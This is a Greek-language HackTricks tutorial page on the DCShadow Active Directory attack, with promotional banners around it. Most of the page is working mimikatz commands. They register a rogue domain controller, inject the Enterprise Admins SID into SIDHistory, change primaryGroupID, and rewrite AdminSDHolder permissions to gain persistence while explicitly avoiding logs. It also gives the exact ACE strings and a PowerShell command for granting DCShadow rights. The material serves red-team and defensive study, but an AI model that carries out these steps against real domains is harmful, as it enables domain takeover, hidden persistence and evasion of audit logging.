<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


# DCShadow

Καταχωρεί έναν **νέο ελεγκτή του τομέα (Domain Controller)** στο AD και το χρησιμοποιεί για να **εισάγει χαρακτηριστικά** (SIDHistory, SPNs...) σε συγκεκριμένα αντικείμενα **χωρίς** να αφήνει **καταγραφές** σχετικά με τις **τροποποιήσεις**. Χρειάζεστε δικαιώματα DA και να βρίσκεστε μέσα στον **κύριο τομέα (root domain)**.\
Σημειώστε ότι εάν χρησιμοποιήσετε λανθασμένα δεδομένα, θα εμφανιστούν αρκετά άσχημα αρχεία καταγραφής.

Για να πραγματοποιήσετε την επίθεση, χρειάζεστε 2 περιπτώσεις του mimikatz. Μία από αυτές θα ξεκινήσει τους διακομιστές RPC με δικαιώματα SYSTEM (πρέπει να υποδείξετε εδώ τις αλλαγές που θέλετε να πραγματοποιήσετε), και η άλλη περίπτωση θα χρησιμοποιηθεί για να εισάγει τις τιμές:

{% code title="mimikatz1 (RPC servers)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% code title="mimikatz2 (push) - Χρειάζεται DA ή παρόμοιο" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Παρατηρήστε ότι το **`elevate::token`** δεν θα λειτουργήσει στη συνεδρία `mimikatz1`, καθώς αυτό ανεβάζει τα προνόμια του νήματος, αλλά χρειαζόμαστε να ανεβάσουμε τα **προνόμια της διεργασίας**.\
Μπορείτε επίσης να επιλέξετε ένα αντικείμενο "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Μπορείτε να εφαρμόσετε τις αλλαγές από έναν DA ή από έναν χρήστη με αυτά τα ελάχιστα δικαιώματα:

* Στο **αντικείμενο του domain**:
* _DS-Install-Replica_ (Προσθήκη/Αφαίρεση αντιγράφου στο Domain)
* _DS-Replication-Manage-Topology_ (Διαχείριση της τοπολογίας αντιγραφής)
* _DS-Replication-Synchronize_ (Συγχρονισμός αντιγραφής)
* Το **αντικείμενο Sites** (και τα παιδιά του) στο **Configuration container**:
* _CreateChild και DeleteChild_
* Το αντικείμενο του **υπολογιστή που είναι καταχωρημένο ως DC**:
* _WriteProperty_ (Όχι Write)
* Το **στοχευμένο αντικείμενο**:
* _WriteProperty_ (Όχι Write)

Μπορείτε να χρησιμοποιήσετε το [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) για να δώσετε αυτά τα προνόμια σε έναν μη προνομιούχο χρήστη (παρατηρήστε ότι αυτό θα αφήσει κάποια αρχεία καταγραφής). Αυτό είναι πολύ πιο περιοριστικό από την έχουσα πρόσβαση DA.\
Για παράδειγμα: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Αυτό σημαίνει ότι το όνομα χρήστη _**student1**_ όταν συνδεθεί στον υπολογιστή _**mcorp-student1**_ έχει δικαιώματα DCShadow πάνω στο αντικείμενο _**root1user**_.

## Χρήση του DCShadow για τη δημιουργία παρασκηνίου

{% code title="Ορισμός των Enterprise Admins στο SIDHistory ενός χρήστη" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% code title="Αλλαγή του PrimaryGroupID (θέτοντας τον χρήστη ως μέλος των Domain Administrators)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% code title="Τροποποίηση του ntSecurityDescriptor του AdminSDHolder (δίνοντας πλήρη έλεγχο σε έναν χρήστη)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Σκιώδης - Δώστε δικαιώματα DCShadow χρησιμοποιώντας το DCShadow (χωρίς τροποποιημένα αρχεία καταγραφής δικαιωμάτων)

Πρέπει να προσθέσουμε τα εξής ACEs με το SID του χρήστη μας στο τέλος:

* Στο αντικείμενο του τομέα:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* Στο αντικείμενο του υπολογιστή του επιτιθέμενου: `(A;;WP;;;UserSID)`
* Στο αντικείμενο του στόχου χρήστη: `(A;;WP;;;UserSID)`
* Στο αντικείμενο Sites στον περιέκτη Configuration: `(A;CI;CCDC;;;UserSID)`

Για να πάρετε το τρέχον ACE ενός αντικειμένου: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Παρατηρήστε ότι σε αυτήν την περίπτωση πρέπει να κάνετε **πολλές αλλαγές,** όχι μόνο μία. Έτσι, στην **συνεδρία mimikatz1** (RPC server) χρησιμοποιήστε την παράμετρο **`/stack` με κάθε αλλαγή** που θέλετε να κάνετε. Με αυτόν τον τρόπο, θα χρειαστεί να κάνετε μόνο μία φορά **`/push`** για να εκτελέσετε όλες τις κολλημένες αλλαγές στον ψεύτικο διακομιστή.

[**Περισσότερες πληροφορίες για το DCShadow στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
